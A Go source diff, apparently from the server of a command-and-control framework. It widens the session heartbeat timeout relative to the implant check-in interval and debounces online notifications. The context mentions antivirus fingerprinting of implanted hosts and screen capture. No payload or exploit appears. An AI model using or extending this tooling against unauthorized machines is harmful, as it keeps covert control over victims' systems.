@@ -205,12 +205,27 @@ func NewServer(cfgPath string) (*Server, error) {
 	sessMgr := session.New()
 	taskMgr := task.New(sessMgr)
 
-	// 会话心跳超时来自监听器配置（默认 60s），让存活判定与植入端心跳节奏对齐，
-	// 避免固定 90s 在长任务/慢网下误判离线（任务忙期还有额外宽限，见 session.MarkBusy）。
+	// 会话心跳超时来自监听器配置（默认 60s）。这里**强制留出余量**（ROADMAP P0-1）：
+	// 阈值至少取 MarginFactor(3) 倍植入端心跳间隔。历史上 interval=60s 与
+	// heartbeat_timeout=60s 几乎零余量，任何一次心跳迟到（调度抖动/网络排队/休眠唤醒）
+	// 都会被判离线，下一次心跳又恢复，前端表现为「离线几秒又在线」抖动。
+	// 每个会话还会用实测心跳间隔自适应放宽（见 session.Session.effectiveTimeout）。
 	if cfg.Listener.HeartbeatTimeout > 0 {
 		session.HeartbeatTimeout = cfg.Listener.HeartbeatTimeout
 	}
-	logging.Info("server", "Session heartbeat timeout: %v", session.HeartbeatTimeout)
+	heartbeatInterval := time.Duration(cfg.Implant.Interval) * time.Second
+	if heartbeatInterval <= 0 {
+		heartbeatInterval = 60 * time.Second
+	}
+	// 会话自适应阈值的起点（载荷可在构建时自定义 interval，实测值会在运行中覆盖它）
+	session.DefaultHeartbeatInterval = heartbeatInterval
+	if withMargin := time.Duration(session.MarginFactor) * heartbeatInterval; withMargin > session.HeartbeatTimeout {
+		logging.Warn("server", "心跳判活阈值 %v 余量不足（植入端心跳间隔 %v），自动放宽为 %v（%d 倍间隔）",
+			session.HeartbeatTimeout, heartbeatInterval, withMargin, session.MarginFactor)
+		session.HeartbeatTimeout = withMargin
+	}
+	logging.Info("server", "Session heartbeat timeout: %v (implant interval %v, margin %dx)",
+		session.HeartbeatTimeout, heartbeatInterval, session.MarginFactor)
 
 	// 加载服务端安全软件指纹库（data/av_fingerprints.json），供 av_detect 任务结果匹配
 	if err := avdetect.Load(); err != nil {
@@ -274,8 +289,11 @@ func NewServer(cfgPath string) (*Server, error) {
 			apiServer.BroadcastSessionOffline(sessionID)
 		})
 		tcpListener.SetOnSessionOnline(func(info *types.SessionInfo) {
-			webhookNotifier.NotifyOnline(info)
-			apiServer.BroadcastSessionOnline(info)
+			// 只有真实状态变化（首次上线 / 观察窗外的复活）才发上线通知，
+			// 避免闪断重连重复推送（广播去抖见 session_broadcast.go）
+			if apiServer.BroadcastSessionOnline(info) {
+				webhookNotifier.NotifyOnline(info)
+			}
 		})
 		tcpListener.SetOnScreenFrame(apiServer.BroadcastScreenFrame)
 	}
@@ -286,8 +304,9 @@ func NewServer(cfgPath string) (*Server, error) {
 			apiServer.BroadcastSessionOffline(sessionID)
 		})
 		httpListener.SetOnSessionOnline(func(info *types.SessionInfo) {
-			webhookNotifier.NotifyOnline(info)
-			apiServer.BroadcastSessionOnline(info)
+			if apiServer.BroadcastSessionOnline(info) {
+				webhookNotifier.NotifyOnline(info)
+			}
 		})
 	}
 
